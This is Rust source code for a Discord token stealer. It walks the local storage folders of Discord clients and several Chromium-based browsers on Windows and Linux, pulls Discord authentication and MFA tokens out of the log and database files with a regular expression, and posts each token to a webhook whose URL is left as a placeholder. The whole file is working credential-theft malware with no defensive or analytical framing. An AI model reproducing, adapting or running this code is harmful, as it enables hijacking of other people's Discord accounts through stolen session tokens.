extern crate dirs;

mod utils;

use regex::Regex;
use utils::{fs::*, webhook::*};

#[cfg(target_os = "mac_os")] // Macdonald's users :)
fn paths() -> Vec<String> {
    vec![]
}

#[cfg(target_os = "linux")] // Linux
fn paths() -> Vec<String> {
    let config_path = dirs::config_dir().unwrap().display().to_string();

    let paths = vec![
        format!("{}/discord", config_path), // Discord
        format!("{}/discordcanary", config_path), // Discord Canary
        format!("{}/discordptb", config_path), // Discord PTB
        format!("{}/google-chrome/Default", config_path), // Google Chrome
        format!("{}/google-chrome-beta/Default", config_path), // Google Chrome Beta
        format!("{}/google-chrome-unstable/Default", config_path), // Google Chrome Dev
        format!("{}/chromium/Default", config_path), // Chromium
        format!("{}/vivaldi/Default", config_path), // Vivaldi
        format!("{}/BraveSoftware", config_path), // Brave
        format!("{}/opera", config_path), // Opera
        format!("{}/yandex-browser", config_path), // Yandex
        format!("{}/yandex-browser-beta", config_path), // Yandex Beta        
    ];

    paths
        .iter()
        .map(|path| format!("{}/Local Storage/leveldb", path))
        .collect()
}

#[cfg(target_os = "windows")]
fn paths() -> Vec<String> {
    let roaming = dirs::config_dir().unwrap().display().to_string();
    let local = dirs::cache_dir().unwrap().display().to_string();
    
    let paths = vec![
        format!("{}\\discord", roaming), // Discord
        format!("{}\\discordcanary", roaming), // Discord Canary
        format!("{}\\discordptb", roaming), // Discord PTB
        format!("{}\\Opera Software\\Opera Stable'", roaming), // Opera
        format!("{}\\Google\\Chrome\\User Data\\Default", local), // Google Chrome
        format!("{}\\Google\\Chrome Beta\\User Data\\Default", local), // Google Chrome Beta
        format!("{}\\Google\\Chrome SxS\\User Data\\Default", local), // Google Chrome Canary
        format!("{}\\Chromium\\User Data\\Default", local), // Chromium
        format!("{}\\BraveSoftware\\Brave-Browser\\User Data\\Default", local), // Brave
        format!("{}\\Yandex\\YandexBrowser\\User Data\\Default", local), // Yandex
        format!("{}\\Microsoft\\Edge\\User Data\\Default", local), // Edge
        format!("{}\\Vivaldi\\User Data\\Default", local), // Vivaldi
    ];

    paths
        .iter()
        .map(|path| format!("{}\\Local Storage\\leveldb", path))
        .collect()
}

fn extract(data: &String) -> Option<String> {
    let regex = Regex::new(
        r#"([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84})"#,
    )
    .unwrap();
    
    let result = regex.captures(&data);

    if let Some(result) = result {
        let token = result.get(0).unwrap().as_str().to_string();
        return Some(token);
    }

    None
}

fn main() {    
    let webhook = Webhook::new("WEBHOOK_URL_HERE".to_string());

    for path in paths() {
        for path in FS::dir(&path) {
            if !path.ends_with(".log") && !path.ends_with(".ldb") {
                continue;
            }

            let file = FS::read(&path);
            let token = extract(&file);

            if let Some(token) = token {
                webhook.send(token.as_str());
            }
        }
    }
}
